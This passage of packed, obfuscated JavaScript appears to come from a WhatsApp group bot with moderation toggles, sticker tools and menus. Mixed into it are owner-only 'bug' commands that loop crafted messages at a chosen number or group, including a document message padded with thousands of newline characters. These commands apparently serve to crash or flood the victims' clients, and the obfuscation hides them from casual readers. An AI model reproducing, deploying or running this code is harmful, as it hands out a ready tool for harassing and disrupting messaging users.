tL=aP[1C.2v(1C.1V()*aP.1F)]3b=F 3i(`S:C.N(1k,{U:3b,Y:\'tM 7r Dp\\n\'+tL},{H:m})G l\'ej\':{if(1s.1F<1)L m.z(`2o:\\n${j}ej ${6d}`)pn=1s.2t(" ")tK=pn.1h(\'\').cw().2t(\'\')m.z(`\\`\\`\\`Dn Dm\\`\\`\\`\\n*🔖>Dl:*\\n${pn}\\n*🔖>Dk:*\\n${tK}`)}G l\'kD\':l\'Dj\':{if(!H)L m.z(`3a U`)if(/U/.1t(2Y)){1r=F C.5v(H)C.N(m.E,{U:{R:1r},tJ:2l},{H:m})}1y if(/2V/.1t(2Y)){1r=F C.5v(H)C.N(m.E,{2V:{R:1r},tJ:2l},{H:m})}}G l\'2T\':l\'tG\':if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s.1F<1)L m.z(\'V bE 2R on to 5k\\fM bE 2R 1A to 4P\')if(1s[0]===\'on\'){if(fN)L m.z(`3n 4C`)2T.3e(1k)fs.6f(\'./4p/2T.4j\',4L.6Q(2T))m.z(\'2T 4C\')}1y if(1s[0]===\'1A\'){B 1r=2T.5l(1k)2T.4Y(1r,1)fs.6f(\'./4p/2T.4j\',4L.6Q(2T))m.z(\'bE 2R 5m\')}G l\'ov\':l\'tF\':if(!m.1N)L m.z(J.1v)if(1s.1F<1)L m.z(\'V 2T on to tE\\fM 2T 1A to 4P\')if(1s[0]===\'on\'){if(fL)L m.z(`3n 4C`)bD.3e(1k)fs.6f(\'./4p/fK.4j\',4L.6Q(2T))z(\'2T pc 4C\')}1y if(1s[0]===\'1A\'){B 1r=2T.5l(1k)bD.4Y(1r,1)fs.6f(\'./4p/fK.4j\',4L.6Q(2T))m.z(\'2T pc 5m\')}G l\'da\':l\'Di\':{if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s[0]==="on"){if(fO)L m.z(\'3n 4C\')bF.3e(1k)m.z(\'3F in 3X on da in 1o 1v\')1m 3Z=F C.4M(1k)1m 3I=3Z[\'3V\']1m 2U=[]3I.2L(4A 3Y=>{2U.3e(3Y.id.3m(\'c.us\',\'s.2d.2q\'))})C.N(1k,{D:`\\`\\`\\`🔖6B🔖\\`\\`\\`\\n\\Dh 6b is tC to 2F tI in 1o 1v,5n 3g 2F 5N be 3O 7b!`,2Q:{2B:2U}},{H:m})}1y if(1s[0]==="1A"){if(!fO)L m.z(\'3n 5m\')B 1A=bF.5l(1k)bF.4Y(1A,1)m.z(\'3F in 3X 1A da 1o 1v\')}1y{B tH=[{1g:`${K}on`,1e:{1f:\'On\'},V:1},{1g:`${K}1A`,1e:{1f:\'5M\'},V:1}]F C.2a(m.E,tH,`3T 5L 1n 4k 4d\\n\\6A to 5k\\6z to 4P`,`${W.1b}`,m)}}G l\'2T\':l\'tG\':if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s.1F<1)L m.z(\'V bE 2R on to 5k\\fM bE 2R 1A to 4P\')if(1s[0]===\'on\'){if(fN)L m.z(`3n 4C`)2T.3e(1k)fs.6f(\'./4p/2T.4j\',4L.6Q(2T))z(\'2T 4C\')}1y if(1s[0]===\'1A\'){B 1r=2T.5l(1k)2T.4Y(1r,1)fs.6f(\'./4p/2T.4j\',4L.6Q(2T))m.z(\'bE 2R 5m\')}G l\'ov\':l\'tF\':if(!m.1N)L m.z(J.1v)if(1s.1F<1)L m.z(\'V 2T on to tE\\fM 2T 1A to 4P\')if(1s[0]===\'on\'){if(fL)L m.z(`3n 4C`)bD.3e(1k)fs.6f(\'./4p/fK.4j\',4L.6Q(2T))z(\'2T pc 4C\')}1y if(1s[0]===\'1A\'){B 1r=2T.5l(1k)bD.4Y(1r,1)fs.6f(\'./4p/fK.4j\',4L.6Q(2T))m.z(\'2T pc 5m\')}G l\'fq\':{if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s[0]==="on"){if(tD)L m.z(\'3n 4C\')pm.3e(1k)m.z(\'3F in 3X on 1v E 3s in 1o 1v\')1m 3Z=F C.4M(1k)1m 3I=3Z[\'3V\']1m 2U=[]3I.2L(4A 3Y=>{2U.3e(3Y.id.3m(\'c.us\',\'s.2d.2q\'))})C.N(1k,{D:`\\`\\`\\`🔖6B🔖\\`\\`\\`\\n\\8g 1a\'re 4D an 2r, 7v\'t 2F 1n 1v 1q in 1o 1v or u 5N be 3O 7b`,2Q:{2B:2U}},{H:m})}1y if(1s[0]==="1A"){if(!tD)L m.z(\'3n 5m\')B 1A=pm.5l(1k)pm.4Y(1A,1)m.z(\'3F in 3X 1A 1v E 3s in 1o 1v\')}1y{B 4Q=[{1g:`${K}on`,1e:{1f:\'On\'},V:1},{1g:`${K}1A`,1e:{1f:\'5M\'},V:1}]F C.2a(m.E,4Q,`3T 5L 1n 4k 4d\\n\\6A to 5k\\6z to 4P`,`${W.1b}`,m)}}G l\'Dg\':l\'Df\':l\'op\':{if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s[0]==="on"){if(fJ)L m.z(\'3n 4C\')bC.3e(1k)m.z(\'3F in 3X on 6j 2V 3s in 1o 1v\')1m 3Z=F C.4M(1k)1m 3I=3Z[\'3V\']1m 2U=[]3I.2L(4A 3Y=>{2U.3e(3Y.id.3m(\'c.us\',\'s.2d.2q\'))})C.N(1k,{D:`\\`\\`\\`🔖6B🔖\\`\\`\\`\\n\\8g 1a\'re 4D an 2r, 7v\'t 2F 1n 6j 2V 1q in 1o 1v or u 5N be 3O 7b!`,2Q:{2B:2U}},{H:m})}1y if(1s[0]==="1A"){if(!fJ)L m.z(\'3n 5m\')B 1A=bC.5l(1k)bC.4Y(1A,1)m.z(\'3F in 3X 1A 6j 2V 3s in 1o 1v\')}1y{B 4Q=[{1g:`${K}on`,1e:{1f:\'On\'},V:1},{1g:`${K}1A`,1e:{1f:\'5M\'},V:1}]F C.2a(m.E,4Q,`3T 5L 1n 4k 4d\\n\\6A to 5k\\6z to 4P`,`${W.1b}`,m)}}G l\'De\':l\'Dd\':l\'oq\':{if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s[0]==="on"){if(fI)L m.z(\'3n 4C\')bB.3e(1k)m.z(\'3F in 3X on 6j dx 3s in 1o 1v\')1m 3Z=F C.4M(1k)1m 3I=3Z[\'3V\']1m 2U=[]3I.2L(4A 3Y=>{2U.3e(3Y.id.3m(\'c.us\',\'s.2d.2q\'))})C.N(1k,{D:`\\`\\`\\`🔖6B🔖\\`\\`\\`\\n\\8g 1a\'re 4D an 2r, 7v\'t 2F 1n 6j dx 1q in 1o 1v or u 5N be 3O 7b!`,2Q:{2B:2U}},{H:m})}1y if(1s[0]==="1A"){if(!fI)L m.z(\'3n 5m\')B 1A=bB.5l(1k)bB.4Y(1A,1)m.z(\'3F in 3X 1A 6j dx 3s in 1o 1v\')}1y{B 4Q=[{1g:`${K}on`,1e:{1f:\'On\'},V:1},{1g:`${K}1A`,1e:{1f:\'5M\'},V:1}]F C.2a(m.E,4Q,`3T 5L 1n 4k 4d\\n\\6A to 5k\\6z to 4P`,`${W.1b}`,m)}}G l\'Dc\':l\'oo\':l\'Db\':{if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s[0]==="on"){if(fH)L m.z(\'3n 4C\')8S.3e(1k)m.z(\'3F in 3X on bA 3s in 1o 1v\')1m 3Z=F C.4M(1k)1m 3I=3Z[\'3V\']1m 2U=[]3I.2L(4A 3Y=>{2U.3e(3Y.id.3m(\'c.us\',\'s.2d.2q\'))})C.N(1k,{D:`\\`\\`\\`🔖6B🔖\\`\\`\\`\\n\\8g 1a\'re 4D an 2r, 7v\'t 2F 1n bA 1q in 1o 1v or u 5N be 3O 7b!`,2Q:{2B:2U}},{H:m})}1y if(1s[0]==="1A"){if(!fH)L m.z(\'3n 5m\')B 1A=8S.5l(1k)8S.4Y(1A,1)m.z(\'3F in 3X 1A bA 3s in 1o 1v\')}1y{B 4Q=[{1g:`${K}on`,1e:{1f:\'On\'},V:1},{1g:`${K}1A`,1e:{1f:\'5M\'},V:1}]F C.2a(m.E,4Q,`3T 5L 1n 4k 4d\\n\\6A to 5k\\6z to 4P`,`${W.1b}`,m)}}G l\'Da\':l\'om\':{if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s[0]==="on"){if(fG)L m.z(\'3n 4C\')bz.3e(1k)m.z(\'3F in 3X on bx 3s in 1o 1v\')1m 3Z=F C.4M(1k)1m 3I=3Z[\'3V\']1m 2U=[]3I.2L(4A 3Y=>{2U.3e(3Y.id.3m(\'c.us\',\'s.2d.2q\'))})C.N(1k,{D:`\\`\\`\\`🔖6B🔖\\`\\`\\`\\n\\8g 1a\'re 4D an 2r, 7v\'t 2F 1n bx 1q in 1o 1v or u 5N be 3O 7b!`,2Q:{2B:2U}},{H:m})}1y if(1s[0]==="1A"){if(!fG)L m.z(\'3n 5m\')B 1A=bz.5l(1k)bz.4Y(1A,1)m.z(\'3F in 3X 1A bx 3s in 1o 1v\')}1y{B 4Q=[{1g:`${K}on`,1e:{1f:\'On\'},V:1},{1g:`${K}1A`,1e:{1f:\'5M\'},V:1}]F C.2a(m.E,4Q,`3T 5L 1n 4k 4d\\n\\6A to 5k\\6z to 4P`,`${W.1b}`,m)}}G l\'D9\':l\'ou\':{if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s[0]==="on"){if(dw)L m.z(\'3n 4C\')fF.3e(1k)m.z(\'3F in 3X on dv 3s in 1o 1v\')1m 3Z=F C.4M(1k)1m 3I=3Z[\'3V\']1m 2U=[]3I.2L(4A 3Y=>{2U.3e(3Y.id.3m(\'c.us\',\'s.2d.2q\'))})C.N(1k,{D:`\\`\\`\\`🔖6B🔖\\`\\`\\`\\n\\8g 1a\'re 4D an 2r, 7v\'t 2F 1n dv 1q in 1o 1v or u 5N be 3O 7b!`,2Q:{2B:2U}},{H:m})}1y if(1s[0]==="1A"){if(!dw)L m.z(\'3n 5m\')B 1A=8S.5l(1k)8S.4Y(1A,1)m.z(\'3F in 3X 1A dv 3s in 1o 1v\')}1y{B 4Q=[{1g:`${K}on`,1e:{1f:\'On\'},V:1},{1g:`${K}1A`,1e:{1f:\'5M\'},V:1}]F C.2a(m.E,4Q,`3T 5L 1n 4k 4d\\n\\6A to 5k\\6z to 4P`,`${W.1b}`,m)}}G l\'D8\':l\'ot\':{if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s[0]==="on"){if(fE)L m.z(\'3n 4C\')bw.3e(1k)m.z(\'3F in 3X on 6t 3s in 1o 1v\')1m 3Z=F C.4M(1k)1m 3I=3Z[\'3V\']1m 2U=[]3I.2L(4A 3Y=>{2U.3e(3Y.id.3m(\'c.us\',\'s.2d.2q\'))})C.N(1k,{D:`\\`\\`\\`🔖6B🔖\\`\\`\\`\\n\\8g 1a\'re 4D an 2r, 7v\'t 2F 1n 6t 1q in 1o 1v or u 5N be 3O 7b!`,2Q:{2B:2U}},{H:m})}1y if(1s[0]==="1A"){if(!fE)L m.z(\'3n 5m\')B 1A=bw.5l(1k)bw.4Y(1A,1)m.z(\'3F in 3X 1A 6t 3s in 1o 1v\')}1y{B 4Q=[{1g:`${K}on`,1e:{1f:\'On\'},V:1},{1g:`${K}1A`,1e:{1f:\'5M\'},V:1}]F C.2a(m.E,4Q,`3T 5L 1n 4k 4d\\n\\6A to 5k\\6z to 4P`,`${W.1b}`,m)}}G l\'D7\':l\'D6\':l\'ol\':{if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s[0]==="on"){if(du)L m.z(\'3n 4C\')bv.3e(1k)m.z(\'3F in 3X on bu 3s in 1o 1v\')1m 3Z=F C.4M(1k)1m 3I=3Z[\'3V\']1m 2U=[]3I.2L(4A 3Y=>{2U.3e(3Y.id.3m(\'c.us\',\'s.2d.2q\'))})C.N(1k,{D:`\\`\\`\\`🔖6B🔖\\`\\`\\`\\n\\8g 1a\'re 4D an 2r, 7v\'t 2F 1n bu 1q in 1o 1v or u 5N be 3O 7b!`,2Q:{2B:2U}},{H:m})}1y if(1s[0]==="1A"){if(!du)L m.z(\'3n 5m\')B 1A=bv.5l(1k)bv.4Y(1A,1)m.z(\'3F in 3X 1A bu 3s in 1o 1v\')}1y{B 4Q=[{1g:`${K}on`,1e:{1f:\'On\'},V:1},{1g:`${K}1A`,1e:{1f:\'5M\'},V:1}]F C.2a(m.E,4Q,`3T 5L 1n 4k 4d\\n\\6A to 5k\\6z to 4P`,`${W.1b}`,m)}}G l\'oj\':{if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s[0]==="on"){if(du)L m.z(\'3n 4C\')bt.3e(1k)m.z(\'3F in 3X on 7Y 3s in 1o 1v\')1m 3Z=F C.4M(1k)1m 3I=3Z[\'3V\']1m 2U=[]3I.2L(4A 3Y=>{2U.3e(3Y.id.3m(\'c.us\',\'s.2d.2q\'))})C.N(1k,{D:`\\`\\`\\`🔖6B🔖\\`\\`\\`\\n\\8g 1a\'re 4D an 2r, 7v\'t 2F 4l 1q in 1o 1v or u 5N be 3O 7b!`,2Q:{2B:2U}},{H:m})}1y if(1s[0]==="1A"){if(!pl)L m.z(\'3n 5m\')B 1A=bt.5l(1k)bt.4Y(1A,1)m.z(\'3F in 3X 1A 7Y 3s in 1o 1v\')}1y{B 4Q=[{1g:`${K}on`,1e:{1f:\'On\'},V:1},{1g:`${K}1A`,1e:{1f:\'5M\'},V:1}]F C.2a(m.E,4Q,`3T 5L 1n 4k 4d\\n\\6A to 5k\\6z to 4P`,`${W.1b}`,m)}}G l\'d9\':{if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s[0]==="on"){if(ds)L m.z(\'3n 4C\')bs.3e(1k)m.z(\'3F in 3X on d9 in 1o 1v\')1m 3Z=F C.4M(1k)1m 3I=3Z[\'3V\']1m 2U=[]3I.2L(4A 3Y=>{2U.3e(3Y.id.3m(\'c.us\',\'s.2d.2q\'))})C.N(1k,{D:`\\`\\`\\`🔖6B🔖\\`\\`\\`\\n\\D5 is tC to tB 8f dt in 1o 1v,8e 3g D4 5N be 3O 7b!`,2Q:{2B:2U}},{H:m})}1y if(1s[0]==="1A"){if(!ds)L m.z(\'3n 5m\')B 1A=bs.5l(1k)bs.4Y(1A,1)m.z(\'3F in 3X 1A d9 in 1o 1v\')}1y{B tA=[{1g:`${K}on`,1e:{1f:\'On\'},V:1},{1g:`${K}1A`,1e:{1f:\'5M\'},V:1}]F C.2a(m.E,tA,`3T 5L 1n 4k 4d\\n\\6A to 5k\\6z to 4P`,`${W.1b}`,m)}}G l\'D3\':l\'eE\':{1m 6y=F 3H(\'S://5K.6i.3z/br/M/8d/eE\')1m 4O=6y.1h(\'\\n\')1m 6x=4O[1C.2v(1C.1V()*4O.1F)]3W=F C.5J(m.E,6x,m,{2N:W.2N,2u:W.2u,})F fs.3j(3W)}G l\'ty\':l\'lu\':{1m 6y=F 3H(\'S://5K.6i.3z/br/M/8d/ty\')1m 4O=6y.1h(\'\\n\')1m 6x=4O[1C.2v(1C.1V()*4O.1F)]3W=F C.5J(m.E,6x,m,{2N:W.2N,2u:W.2u,})F fs.3j(3W)}G l\'kE\':{if(!q)L m.z(\' 3T D2 1q or D!\')B tx=F dr.D1(q,{D0:35})B M=4v CZ.1k(tx.3m(\'M:U/tw;8R,\',\'\'),\'8R\')B 6w=8P(\'.6Z\')F fs.6f(\'./\'+6w,M)B tv=fs.3E(\'./\'+6w)F C.N(1k,{U:tv,Y:"1I 1a go! 🏃🏻‍♂️"},{H:m})dq(()=>{fs.3j(6w)},pf)}G l\'n8\':{if(!dp)L m.z(\'3a 1n 7a!\')B 1S=F C.5v(m.1W.4W.2Q.dn.6Y,\'U\')B pk=F 8Q(1S)B 1r=F tu(pk)1z.1B(pk)1z.1B(1r)F C.N(1k,{U:{R:1r.CY},Y:"1I 1a go! 🏃🏻‍♂️"},{H:m})}G l\'oH\':{if(!m.2n.3B&&!2b)L m.z(J.2j)if(!dp)L m.z(\'3a 1n 7a!\')B 1S=F C.pb(m.1W.4W.2Q.dn.6Y,\'U\')F fs.6f(\'./5i/8L/pj.6Z\',1S)m.z(J.4X)}G l\'CX\':l\'eG\':l\'4N-bg\':{if(!dp)L m.z(\'3a 1n 7a!\')B 1S=F C.pb(m.1W.4W.2Q.dn.6Y,\'U\')B pi=8P(\'.6Z\')F fs.6f(\'./5i/U/\'+pi,1S)1d pg=\'./5i/U/\'+pi B 1r=F 4N(fs.3E(pg))1z.1B(1r)B ph=8P(\'.6Z\')F fs.6f(\'./5i/U/\'+ph,1r)1d 6w=\'./5i/U/\'+ph F C.N(1k,{U:{R:6w},Y:"1I 1a go! 🏃🏻‍♂️"},{H:m})dq(()=>{fs.3j(6w)},pf)dq(()=>{fs.3j(pg)},pf)}G l\'CW\':{if((!pe&&!dp)&&1s.1F==0){B 3b=F C.5v(m.1W.4W.2Q.dn.6Y,\'U\')1m ts=1P("CV");ts.7u(3b,8A(P,U){if(P){1z.6h(P)}1m qr=4v tr();qr.CU=8A(P,8c){if(P){1z.6h(P)}1z.1B(8c.1E);m.z(8c.1E)};qr.CT(U.CS)})}1y{m.z(`3a U 3N Y ${j+K}\\n`)}}G l\'CR\':l\'CQ\':l\'wm\':l\'cz\':{B 6v=q.1h("|")[0]B 6g=q.1h("|")[1]if(!tq)L m.z(`3a to a 2R 3N Y CP|D\\n\\6e:${j+K}pd|ad`)if(!6v)L m.z(`2o!:${8O+\' \'+`pd|ad`}`)if(!6g)L m.z(`2o!:${8O+\' \'+`pd|ad`}`)C.N(1k,{8I:{D:"🔖",2n:m.2n}})6p{B 6w=F C.pb(m.1W.4W.2Q.dn.tp,\'2R\')1z.1B(6w)B pa=F tn(6w,{2N:6v,2u:6g})F C.N(1k,{2R:{R:pa}},{H:m})F fs.3j(pa)}1j(e){m.z(e)}}G l\'oI\':if(!2b)L m.z(J.2j)if(!q)L z("4c D")1d 1v=F C.CO(q,[2j+"@s.2d.2q"])m.z(J.4X)C.N(1v.id,{D:\'CN!!\'})G l\'CM\':l\'CL\':if(!2b)L m.z(J.2j)p9.3e(`${q}`)p9.4Y(0,1)fs.6f(\'./4p/p8.4j\',4L.6Q(CK))m.z(\'4X p8!\')G l\'CJ\':{if(!1s[0])Q`2o:bq|bq|bq`if(!D.2i(\'|\'))Q`CI 3N*|*\\n\\6e:\\n*${j+K}*my tl|n|bq|bq|bq`B 2m=F C.tm(m.1l)B a=[]B b=D.1h(\'|\')1U(B c=1||0;c<b.1F;c++){a.3e([b[c]])}L C.CH(m.E,`*CG CF by:*${2m}\\n\\n*4B:*${D.1h(\'|\')[0]}`,a,m)}G l\'tl\':{if(!2b)L 1m p6=dl(m.E,bo.4B.dk({"CE":{"2m":1b,"CD":[{"dm":"8b tk CC"},{"dm":"8b CB CA Cz 14 Cy Cx"},{"dm":"8b TO p7 Cw +84 Cv"},{"dm":"8b TO p7 +54"},{"dm":"8b TO p7 +64"}],"Cu":5}}),{bn:m.E,H:ab})C.dh(m.E,p6.1W,{fA:p6.2n.id})tj(\'p5 Ct\')}G l\'Cs\':{if(!2b)L B 1Y=`*Cr IS A Cq Cp?🔖🔖*4B:${q?q:\'ti\'}*\\n\\n`1U(B ac of 3V){1Y+=`🔖­”@${ac.id.1h(\'@\')[0]}\\n`}C.N(m.E,{D:1Y,3y:3V.2L(a=>a.id)},{H:ab})}G l\'Co\':{if(1s.1F<1)L m.z(`*2w!*\\n\\th:${K}Cn 8J|tg p4|tf\\6e:${K}Cm.2d.2q|1|te\\n\\n\\ns=td\\n\\n`)8N=q.1h(\'|\')[0]bp=q.1h(\'|\')[1]1U(B i=0;i<bp;i++){m.z(`tb ta!`)1m t9=F p3({U:fs.3E(\'./7Z/p1.fD\')},{p0:C.t8})1m 8a=dl(8N,bo.4B.dk({"8a":{"oZ":"oY","t7":"7t","4W":{"D":wm,}}}),{bn:m.E,H:ab})C.dh(8N,8a.1W,{fA:8a.2n.id})}m.z(`3F Cl t6 To:${8N}\\fC t5:${bp}`)}G l\'Ck\':{if(!2b)L if(1s.1F<1)L m.z(`*Cj 2w!*\\n\\th:${K}Ci|p4 tg|tf\\6e:${K}Ch@g.us|1|te\\n\\n\\ns=td\\n\\Cg tc 1n 6X 3G Cf 1n 1v`)8N=q.1h(\'|\')[0]bp=q.1h(\'|\')[1]1U(B i=0;i<bp;i++){m.z(`tb ta`)1m t9=F p3({U:fs.3E(\'./7Z/p1.fD\')},{p0:C.t8})1m 8a=dl(8N,bo.4B.dk({"8a":{"oZ":"oY","t7":"7t","4W":{"D":`MY Ce HW Cd Cc`,}}}),{bn:m.E,H:ab})C.dh(8N,8a.1W,{fA:8a.2n.id})}m.z(`3F 3U t6 To:${8N}\\fC t5:${bp}`)}G l\'Cb\':{if(!2b)L t4=fs.3E(\'./7Z/t1.aa\')C.N(m.E,{6U:t4,3C:\'fB/t3-t2\',5I:`${1b}${dj}.aa`},{H:ab})}G l\'Ca\':{if(!2b)L t0=fs.3E(\'./7Z/t1.aa\')C.N(m.E,{6U:t0,3C:\'\',5I:`${1b}${dj}.aa`},{H:ab})}G l\'C9\':{if(!2b)L 1m 6U=dl(m.E,bo.4B.dk({"oX":{"R":"S://oW.2d.2q/d/f/C8-C7.di","3C":"","2e":1b,"6W":"C6+/C5+C4=","oP":0,"oV":"C3+C2=","5I":`🔖¦„${6d}🔖¦„\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n.${dj}.aa`,"oU":"C1/C0/BZ=","sZ":"/v/sY.BY-24/BX.di?BW=11-4&oh=BV&oe=BU","sX":"BT",}}),{bn:m.E})C.dh(m.E,6U.1W,{fA:6U.2n.id})}G l\'sD\':Q`sF to My sW sV 7Y sU 3g BS BR 1o eu 3S!!!`G l\'kC\':l\'BQ\':l\'6c\':l\'5D\':l\'BP\':l\'?\':{B 5j=dg+\'@s.2d.2q\'B me=m.1l B sT=6V();B sS=6V()-sT B sJ=`BO🙇🏻‍♂️‘👋🏻${7W}${a9}💭💲:${sS.df(4)}BN💲:${a8(bm.bl())}💲:@${oS.1h(\'@\')[0]}💲:${W.1b}💲:@${5j.1h(\'@\')[0]}NO-BM💲:${C.a5?\'sR\':`sQ`}💲:${os.BL()}💲:${os.BK()}💲:${3R.7X(W.db.M.3M).1F}💲:${sP}💲:${sO}🥷🏻:${7W}🕴🏻:@${me.1h(\'@\')[0]}🕴🏻:${a7?\'🧑🏻‍💻\':``}🕴🏻:${a7?\'sN\':`${db.M.3M[m.1l].a6}`}⏰:${sM}🏷️:${sL}🛂3T oT🛂1X 7s 8M🐤`B 5u=[5j,me,oS]B 1c=[{1g:\'oN\',1e:{1f:\'bi 2z\'},V:1},{1g:\'K\',1e:{1f:\'3L 2z\'},V:1},{1g:\'sc\',1e:{1f:\'4b\'},V:1}]B 1R={6U:fs.3E(\'./5i/8L/BJ.BI\'),5I:`${4M.oR}`,3C:`${sK}`,oQ:\'BH\',oP:\'BG\',Y:sJ,1J:1b,1c:1c,3y:5u,1G:4,2Q:{fz:{2e:1b,6b:wm,oO:2l,6T:5t,sI:2,sH:bj,fy:bj}}}C.N(m.E,1R,{H:fx})}G G l\'K\':{1d fw=[{"2e":"BF 3D Of bk 🥷🏻","de":[{"2e":"kG 🔖•","3r":"4u 1X 3L Of kG 3D","3K":`${j}rY`}]},{"2e":"bk 3D 🔖","de":[{"2e":"bi 2z ","3r":"4u 1X 3L Of bi 1X 3D!","3K":`${j}oN`},{"2e":"3q 2z 🔖’ ","3r":"4u 1X 3L Of 3q 3D","3K":`${j}sA`},{"2e":"5H 2z 🔖¨","3r":"4u 1X 3L Of BE 3D","3K":`${j}sx`},{"2e":"od 2z 🔖","3r":"4u 1X 3L Of BD BC 3D","3K":`${j}sv`},{"2e":"em 2z 🔖","3r":"4u 1X 3L Of em 3D","3K":`${j}s4`},{"2e":"eZ 2z 🔖","3r":"4u 1X 3L Of eZ 3D","3K":`${j}sr`},{"2e":"aT 2z 🔖","3r":"4u 1X 3L Of aT 3D","3K":`${j}sb`},{"2e":"b2 2z 🔖","3r":"4u 1X 3L Of sG 3D","3K":`${j}sp`},{"2e":"aZ 3x 2z 🔖","3r":"4u 1X 3L Of aZ 3x 3D","3K":`${j}si`},{"2e":"3x nb 2z 🔖","3r":"4u 1X 3L Of 3x nb 3D","3K":`${j}se`},{"2e":"aU 2z 🔖","3r":"4u 1X 3L Of aZ aU 3D","3K":`${j}n0`},{"2e":"nm 2z 🔖","3r":"4u 1X 3L Of nm 3D","3K":`${j}sg`},{"2e":"aU aT 2z 🔖","3r":"4u 1X 3L Of aU aT 3D","3K":`${j}sa`},{"2e":"s8 2z 🔖“","3r":"4u 1X 3L Of BB 3D","3K":`${j}s9`},{"2e":"lC 2z 🔖","3r":"4u 1X 3L Of lC 3D","3K":`${j}s6`},{"2e":"aQ 2z 🔖","3r":"4u 1X 3L Of aQ 3D","3K":`${j}s3`},{"2e":"7S 2z 🔖","3r":"4u 1X 3L Of 7S 3D","3K":`${j}sm`},{"2e":"el 2z 🔖","3r":"4u 1X 3L Of el 3D","3K":`${j}rZ`}]},{"2e":"8K 4i BA Bz 🔖","de":[{"2e":"9M 8K 2z 🔖","3r":"4u 1X 3L Of 9M 8K 3D","3K":`${j}s1`}]},{"2e":"sE 🔖","de":[{"2e":"sF To 🔖","3r":"4u 1X 3L Of sE Of 1X bk !!","3K":`${j}sD`}]}]1d sB={D:"3T 7r 1n 5D📸",1J:`${1b}\\n“🕴🏻dd:${bj}\\n🕴🏻4b:${sC}`,2e:`Hi👋🏻‘‹${7W}`,1e:"2z🙇🏻‍♂️",fw}1d 4q=F C.N(m.E,sB)}G l\'oN\':{1m 2O=F 3i(4s+\'bi 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🥷🏻sz🔖• ${j}oL🔖• ${j}a5🔖• ${j}2t[1q]🔖• ${j}oK🔖• ${j}fv🔖• 